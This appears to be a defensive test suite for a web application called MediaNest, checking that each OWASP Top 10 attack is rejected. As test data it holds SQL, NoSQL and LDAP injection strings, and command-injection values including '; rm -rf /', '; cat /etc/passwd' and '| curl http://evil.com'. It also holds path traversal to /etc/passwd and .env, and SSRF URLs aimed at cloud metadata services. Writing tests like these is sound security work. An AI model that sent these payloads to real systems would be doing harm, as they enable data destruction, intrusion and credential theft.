/**
 * OWASP Top 10 Security Vulnerabilities Test Suite
 *
 * Comprehensive tests covering all OWASP Top 10 security vulnerabilities for 2021/2023
 * Validates MediaNest protection against the most critical web application security risks
 */

import { describe, test, expect, beforeEach, afterEach, beforeAll, afterAll } from 'vitest';
import supertest from 'supertest';
import { createApp } from '../../src/app';
import { PrismaClient } from '@prisma/client';
import { AuthTestHelper } from '../helpers/auth-test-helper';
import { DatabaseTestHelper } from '../helpers/database-test-helper';

describe('OWASP Top 10 Security Vulnerabilities Test Suite', () => {
  let app: any;
  let request: supertest.SuperTest<supertest.Test>;
  let prisma: PrismaClient;
  let authHelper: AuthTestHelper;
  let dbHelper: DatabaseTestHelper;
  let userToken: string;
  let adminToken: string;
  let userId: string;

  beforeAll(async () => {
    app = createApp();
    request = supertest(app);
    prisma = new PrismaClient();
    authHelper = new AuthTestHelper(prisma);
    dbHelper = new DatabaseTestHelper(prisma);

    // Create test users
    const user = await authHelper.createTestUser('owasp-user', 'owasp-user@test.com');
    const admin = await authHelper.createTestUser('owasp-admin', 'owasp-admin@test.com', 'admin');

    userId = user.id;
    userToken = await authHelper.generateValidToken(user.id, 'user');
    adminToken = await authHelper.generateValidToken(admin.id, 'admin');
  });

  afterAll(async () => {
    await dbHelper.cleanup();
    await prisma.$disconnect();
  });

  describe('A01:2021 – Broken Access Control', () => {
    test('should prevent vertical privilege escalation', async () => {
      // Regular user trying to access admin functions
      const adminEndpoints = [
        { method: 'get', path: '/api/v1/admin/users' },
        { method: 'patch', path: `/api/v1/admin/users/${userId}/role` },
        { method: 'delete', path: `/api/v1/admin/users/${userId}` },
        { method: 'get', path: '/api/v1/admin/system' },
        { method: 'post', path: '/api/v1/admin/maintenance' },
      ];

      for (const endpoint of adminEndpoints) {
        const response = await request[endpoint.method](endpoint.path)
          .send({ role: 'admin' })
          .set('Authorization', `Bearer ${userToken}`);

        expect([403, 404]).toContain(response.status);
        expect(response.body).not.toHaveProperty('users');
        expect(response.body).not.toHaveProperty('systemInfo');
      }
    });

    test('should prevent horizontal privilege escalation', async () => {
      // Create second user to test access control
      const user2 = await authHelper.createTestUser('user2', 'user2@test.com');
      const user2Token = await authHelper.generateValidToken(user2.id, 'user');

      // User 1 trying to access User 2's resources
      const response = await request
        .get(`/api/v1/users/${user2.id}/profile`)
        .set('Authorization', `Bearer ${userToken}`);

      expect([403, 404]).toContain(response.status);
    });

    test('should prevent insecure direct object references (IDOR)', async () => {
      const idorAttempts = [
        `/api/v1/media/requests/1`,
        `/api/v1/media/requests/999999`,
        `/api/v1/users/1/settings`,
        `/api/v1/admin/logs/1`,
        `/api/v1/downloads/1`,
      ];

      for (const path of idorAttempts) {
        const response = await request.get(path).set('Authorization', `Bearer ${userToken}`);

        // Should not expose other users' resources
        expect([403, 404]).toContain(response.status);
      }
    });

    test('should enforce proper access controls on file operations', async () => {
      const fileAccess = [
        '/api/v1/files/../../../etc/passwd',
        '/api/v1/files/config/database.yml',
        '/api/v1/files/.env',
        '/api/v1/files/logs/admin.log',
      ];

      for (const path of fileAccess) {
        const response = await request.get(path).set('Authorization', `Bearer ${userToken}`);

        expect([400, 403, 404]).toContain(response.status);
      }
    });
  });

  describe('A02:2021 – Cryptographic Failures', () => {
    test('should use HTTPS for sensitive data transmission', async () => {
      // Check security headers that enforce HTTPS
      const response = await request
        .get('/api/v1/auth/session')
        .set('Authorization', `Bearer ${userToken}`);

      expect(response.headers).toHaveProperty('strict-transport-security');
    });

    test('should not expose sensitive data in responses', async () => {
      const response = await request
        .get('/api/v1/users/profile')
        .set('Authorization', `Bearer ${userToken}`);

      if (response.status === 200) {
        expect(response.body).not.toHaveProperty('password');
        expect(response.body).not.toHaveProperty('passwordHash');
        expect(response.body).not.toHaveProperty('secret');
        expect(response.body).not.toHaveProperty('privateKey');
        expect(response.body).not.toHaveProperty('apiKey');
        expect(response.body).not.toHaveProperty('sessionSecret');
      }
    });

    test('should not store sensitive data in plaintext', async () => {
      // Test that sensitive configuration is not exposed
      const configEndpoints = [
        '/api/v1/config',
        '/api/v1/environment',
        '/api/v1/secrets',
        '/.env',
        '/config.json',
      ];

      for (const endpoint of configEndpoints) {
        const response = await request.get(endpoint).set('Authorization', `Bearer ${adminToken}`);

        expect([404, 403]).toContain(response.status);
      }
    });

    test('should use secure random number generation', async () => {
      // Generate multiple tokens and verify randomness
      const tokens = [];

      for (let i = 0; i < 10; i++) {
        const response = await request
          .get('/api/v1/csrf/token')
          .set('Authorization', `Bearer ${userToken}`);

        if (response.status === 200) {
          tokens.push(response.body.token);
        }
      }

      // All tokens should be unique (indicating good randomness)
      const uniqueTokens = new Set(tokens);
      expect(uniqueTokens.size).toBe(tokens.length);

      // Tokens should be sufficiently long
      tokens.forEach((token) => {
        expect(token.length).toBeGreaterThanOrEqual(32);
      });
    });
  });

  describe('A03:2021 – Injection', () => {
    test('should prevent SQL injection in all query parameters', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1' --",
        "' UNION SELECT password FROM users --",
        "1'; UPDATE users SET role='admin' WHERE id=1; --",
      ];

      const endpoints = [
        { method: 'get', path: '/api/v1/media/search', param: 'query' },
        { method: 'get', path: '/api/v1/admin/users', param: 'search' },
        { method: 'get', path: '/api/v1/media/requests', param: 'status' },
      ];

      for (const endpoint of endpoints) {
        for (const payload of sqlInjectionPayloads) {
          const response = await request[endpoint.method](endpoint.path)
            .query({ [endpoint.param]: payload })
            .set('Authorization', `Bearer ${adminToken}`);

          // Should not cause database errors or expose data
          expect(response.status).not.toBe(500);

          if (response.status === 200) {
            expect(response.body).not.toHaveProperty('password');
            expect(response.body).not.toHaveProperty('secret');
          }
        }
      }
    });

    test('should prevent NoSQL injection attacks', async () => {
      const noSqlPayloads = [
        { $ne: null },
        { $gt: '' },
        { $where: 'this.password' },
        { $regex: '.*' },
        { $or: [{ password: '' }, { password: { $exists: true } }] },
      ];

      for (const payload of noSqlPayloads) {
        const response = await request
          .post('/api/v1/media/request')
          .send({
            title: 'Test Movie',
            type: 'movie',
            tmdbId: payload,
          })
          .set('Authorization', `Bearer ${userToken}`);

        expect([400, 422]).toContain(response.status);
      }
    });

    test('should prevent command injection', async () => {
      const commandPayloads = [
        '; cat /etc/passwd',
        '| whoami',
        '& ls -la',
        '`id`',
        '$(cat /etc/hosts)',
        '; rm -rf /',
        '| curl http://evil.com',
      ];

      for (const payload of commandPayloads) {
        const response = await request
          .post('/api/v1/youtube/download')
          .send({ url: `https://youtube.com/watch?v=test${payload}` })
          .set('Authorization', `Bearer ${userToken}`);

        expect([400, 422]).toContain(response.status);
      }
    });

    test('should prevent LDAP injection', async () => {
      const ldapPayloads = ['*', '*)(&', '*)(uid=*', '*)((|uid=*', '*(|(password=*))'];

      for (const payload of ldapPayloads) {
        const response = await request
          .post('/api/v1/auth/ldap')
          .send({ username: payload, password: 'test' })
          .set('Authorization', `Bearer ${userToken}`);

        expect([400, 401, 404]).toContain(response.status);
      }
    });
  });

  describe('A04:2021 – Insecure Design', () => {
    test('should implement secure business logic', async () => {
      // Test for logical flaws in business processes

      // 1. User cannot approve their own media requests
      const createResponse = await request
        .post('/api/v1/media/request')
        .send({ title: 'Self Approval Test', type: 'movie', tmdbId: 12345 })
        .set('Authorization', `Bearer ${userToken}`);

      if (createResponse.status === 201) {
        const requestId = createResponse.body.data.id;

        const approvalResponse = await request
          .patch(`/api/v1/media/requests/${requestId}/approve`)
          .set('Authorization', `Bearer ${userToken}`);

        expect([403, 404]).toContain(approvalResponse.status);
      }
    });

    test('should prevent race conditions in critical operations', async () => {
      // Concurrent requests that might cause race conditions
      const concurrentRequests = Array(10)
        .fill(null)
        .map(() =>
          request
            .post('/api/v1/media/request')
            .send({ title: 'Race Condition Test', type: 'movie', tmdbId: 99999 })
            .set('Authorization', `Bearer ${userToken}`),
        );

      const responses = await Promise.all(concurrentRequests);

      // Should handle concurrent requests properly
      const successCount = responses.filter((r) => [200, 201].includes(r.status)).length;

      // For duplicate requests, only one should succeed
      expect(successCount).toBeLessThanOrEqual(1);
    });

    test('should implement proper resource limits', async () => {
      // Test resource consumption limits
      const response = await request
        .post('/api/v1/media/request')
        .send({
          title: 'A'.repeat(10000), // Very long title
          description: 'B'.repeat(50000), // Very long description
          type: 'movie',
          tmdbId: 12345,
        })
        .set('Authorization', `Bearer ${userToken}`);

      expect([400, 413, 422]).toContain(response.status);
    });
  });

  describe('A05:2021 – Security Misconfiguration', () => {
    test('should not expose server information', async () => {
      const response = await request.get('/api/v1/health');

      // Should not expose server/framework versions
      expect(response.headers).not.toHaveProperty('server');
      expect(response.headers).not.toHaveProperty('x-powered-by');
      expect(response.headers).not.toHaveProperty('x-aspnet-version');
    });

    test('should have secure HTTP headers', async () => {
      const response = await request.get('/api/v1/health');

      // Security headers should be present
      expect(response.headers).toHaveProperty('x-content-type-options', 'nosniff');
      expect(response.headers).toHaveProperty('x-frame-options');
      expect(['DENY', 'SAMEORIGIN']).toContain(response.headers['x-frame-options']);
      expect(response.headers).toHaveProperty('x-xss-protection');
      expect(response.headers['x-xss-protection']).toMatch(/1; mode=block/);
    });

    test('should not expose directory listings', async () => {
      const directories = ['/api/', '/uploads/', '/static/', '/assets/', '/config/', '/logs/'];

      for (const dir of directories) {
        const response = await request.get(dir);

        expect(response.status).not.toBe(200);
        expect(response.text).not.toContain('Index of');
        expect(response.text).not.toContain('Directory listing');
      }
    });

    test('should not expose error stack traces', async () => {
      // Try to cause an error
      const response = await request
        .post('/api/v1/media/request')
        .send({ invalid: 'data' })
        .set('Authorization', `Bearer ${userToken}`);

      const responseText = JSON.stringify(response.body);

      // Should not contain stack traces
      expect(responseText).not.toMatch(/at \w+/); // Stack trace format
      expect(responseText).not.toMatch(/\.js:\d+:\d+/);
      expect(responseText).not.toContain('Error:');
      expect(responseText).not.toContain('TypeError:');
      expect(responseText).not.toMatch(/node_modules/);
    });
  });

  describe('A06:2021 – Vulnerable and Outdated Components', () => {
    test('should not use vulnerable dependencies', async () => {
      // This would require checking package versions
      // For now, verify security endpoints exist
      const response = await request
        .get('/api/v1/security/dependencies')
        .set('Authorization', `Bearer ${adminToken}`);

      // Endpoint might not exist, but shouldn't expose vulnerability info to non-admins
      if (response.status === 200) {
        expect(response.body).toHaveProperty('dependencies');
      }
    });

    test('should validate component integrity', async () => {
      // Check for subresource integrity or similar protections
      const response = await request.get('/api/v1/health');

      // Basic health check should work
      expect(response.status).toBe(200);
    });
  });

  describe('A07:2021 – Identification and Authentication Failures', () => {
    test('should prevent brute force attacks', async () => {
      const attempts: Promise<any>[] = [];

      // Multiple failed login attempts
      for (let i = 0; i < 20; i++) {
        attempts.push(
          request
            .post('/api/v1/auth/plex/verify')
            .send({ pin: `wrong-${i}`, username: 'brute-force-test' }),
        );
      }

      const responses = await Promise.all(attempts);

      // Should start rate limiting
      const rateLimited = responses.filter((r) => r.status === 429).length;
      expect(rateLimited).toBeGreaterThan(0);
    });

    test('should enforce strong session management', async () => {
      // Session should be invalidated on logout
      const logoutResponse = await request
        .post('/api/v1/auth/logout')
        .set('Authorization', `Bearer ${userToken}`);

      expect([200, 204]).toContain(logoutResponse.status);

      // Token should be invalid after logout
      const testResponse = await request
        .get('/api/v1/dashboard/stats')
        .set('Authorization', `Bearer ${userToken}`);

      expect([401, 403]).toContain(testResponse.status);
    });

    test('should prevent session fixation', async () => {
      const response = await request
        .post('/api/v1/auth/plex/verify')
        .send({ pin: '1234', username: 'fixation-test' })
        .set('Cookie', 'sessionId=attacker-fixed-id');

      const cookies = response.headers['set-cookie'];
      if (cookies) {
        const sessionCookie = cookies.find((cookie: string) => cookie.includes('sessionId'));

        if (sessionCookie) {
          expect(sessionCookie).not.toContain('attacker-fixed-id');
        }
      }
    });
  });

  describe('A08:2021 – Software and Data Integrity Failures', () => {
    test('should validate data integrity', async () => {
      // Test data validation and integrity checks
      const response = await request
        .post('/api/v1/media/request')
        .send({
          title: 'Test Movie',
          type: 'invalid-type', // Invalid enum value
          tmdbId: 'not-a-number', // Invalid data type
        })
        .set('Authorization', `Bearer ${userToken}`);

      expect([400, 422]).toContain(response.status);
    });

    test('should prevent tampering with serialized data', async () => {
      // Test for insecure deserialization
      const maliciousPayload = {
        __proto__: { role: 'admin' },
        constructor: { prototype: { role: 'admin' } },
        title: 'Test Movie',
        type: 'movie',
        tmdbId: 12345,
      };

      const response = await request
        .post('/api/v1/media/request')
        .send(maliciousPayload)
        .set('Authorization', `Bearer ${userToken}`);

      // Should not cause privilege escalation
      if (response.status === 201) {
        // Verify user role wasn't changed
        const userCheck = await request
          .get('/api/v1/admin/users')
          .set('Authorization', `Bearer ${userToken}`);

        expect([401, 403]).toContain(userCheck.status);
      }
    });
  });

  describe('A09:2021 – Security Logging and Monitoring Failures', () => {
    test('should log security events', async () => {
      // Generate a security event (failed login)
      await request
        .post('/api/v1/auth/plex/verify')
        .send({ pin: 'wrong-pin', username: 'security-test' });

      // Check if security logs are available (for admin)
      const response = await request
        .get('/api/v1/admin/security-logs')
        .set('Authorization', `Bearer ${adminToken}`);

      if (response.status === 200) {
        expect(response.body).toHaveProperty('logs');
        expect(Array.isArray(response.body.logs)).toBe(true);
      }
    });

    test('should monitor for suspicious activities', async () => {
      // Generate suspicious activity pattern
      for (let i = 0; i < 10; i++) {
        await request.get('/api/v1/admin/users').set('Authorization', `Bearer ${userToken}`);
      }

      // Check for alerts
      const alertResponse = await request
        .get('/api/v1/admin/alerts')
        .set('Authorization', `Bearer ${adminToken}`);

      if (alertResponse.status === 200) {
        expect(alertResponse.body).toHaveProperty('alerts');
      }
    });

    test('should not log sensitive information', async () => {
      // Test that passwords/tokens aren't logged
      const response = await request
        .get('/api/v1/admin/access-logs')
        .set('Authorization', `Bearer ${adminToken}`);

      if (response.status === 200 && response.body.logs) {
        response.body.logs.forEach((log: any) => {
          const logString = JSON.stringify(log);
          expect(logString).not.toMatch(/password|secret|token.*Bearer/i);
        });
      }
    });
  });

  describe('A10:2021 – Server-Side Request Forgery (SSRF)', () => {
    test('should prevent SSRF attacks via URL parameters', async () => {
      const ssrfPayloads = [
        'http://localhost:8080/admin',
        'http://127.0.0.1:22',
        'http://169.254.169.254/latest/meta-data/', // AWS metadata
        'http://metadata.google.internal/computeMetadata/v1/', // GCP metadata
        'file:///etc/passwd',
        'ftp://internal-server/',
        'gopher://localhost:8080/_GET%20/admin',
        'http://0.0.0.0:8080/admin',
        'http://[::1]:8080/admin',
      ];

      for (const url of ssrfPayloads) {
        const response = await request
          .post('/api/v1/media/import')
          .send({ url })
          .set('Authorization', `Bearer ${userToken}`);

        expect([400, 422]).toContain(response.status);
      }
    });

    test('should validate and sanitize URLs', async () => {
      const validUrl = 'https://api.themoviedb.org/3/movie/550';

      const response = await request
        .post('/api/v1/media/import')
        .send({ url: validUrl })
        .set('Authorization', `Bearer ${userToken}`);

      // Should either accept valid URLs or reject all imports
      expect([200, 201, 400, 404, 422]).toContain(response.status);
    });

    test('should prevent DNS rebinding attacks', async () => {
      const rebindingUrls = [
        'http://evil.com.127.0.0.1.nip.io/',
        'http://127.0.0.1.evil.com/',
        'http://evil.com@127.0.0.1/',
        'http://evil.com#@127.0.0.1/',
      ];

      for (const url of rebindingUrls) {
        const response = await request
          .post('/api/v1/media/import')
          .send({ url })
          .set('Authorization', `Bearer ${userToken}`);

        expect([400, 422]).toContain(response.status);
      }
    });
  });

  describe('Additional Security Tests', () => {
    test('should prevent HTTP response splitting', async () => {
      const responseSplittingPayloads = [
        'test\r\nSet-Cookie: admin=true',
        'value\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>',
        'param\n\rLocation: http://evil.com',
      ];

      for (const payload of responseSplittingPayloads) {
        const response = await request
          .get('/api/v1/media/search')
          .query({ query: payload })
          .set('Authorization', `Bearer ${userToken}`);

        // Headers should not be split
        const headerString = JSON.stringify(response.headers);
        expect(headerString).not.toContain('Set-Cookie: admin=true');
        expect(response.headers).not.toHaveProperty('location', 'http://evil.com');
      }
    });

    test('should prevent cache poisoning', async () => {
      const cachePoisons = [
        { 'X-Forwarded-Host': 'evil.com' },
        { 'X-Host': 'malicious.com' },
        { 'X-Forwarded-Proto': 'javascript' },
      ];

      for (const headers of cachePoisons) {
        const response = await request.get('/api/v1/health').set(headers);

        // Response should not be influenced by poisoning headers
        expect(response.status).toBe(200);
        expect(response.headers).not.toHaveProperty('location');
      }
    });

    test('should implement proper CORS policy', async () => {
      const corsResponse = await request
        .options('/api/v1/media/search')
        .set('Origin', 'http://evil.com');

      if (corsResponse.headers['access-control-allow-origin']) {
        // Should not allow arbitrary origins
        expect(corsResponse.headers['access-control-allow-origin']).not.toBe('*');
        expect(corsResponse.headers['access-control-allow-origin']).not.toBe('http://evil.com');
      }
    });
  });
});
